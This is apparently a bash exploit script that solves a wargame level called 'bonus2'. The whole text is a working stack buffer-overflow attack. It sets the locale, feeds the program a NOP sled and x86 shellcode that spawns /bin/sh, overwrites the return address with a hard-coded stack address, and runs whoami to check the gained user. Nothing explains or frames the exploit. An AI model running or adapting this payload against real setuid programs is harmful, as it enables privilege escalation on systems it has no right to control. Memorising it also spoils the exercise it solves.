#!/bin/bash -p
export LANG=nl
./bonus2 $(python -c 'print "\x90"*40') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*2 + "\xbf\xff\xf6\x88"[::-1]')
whoami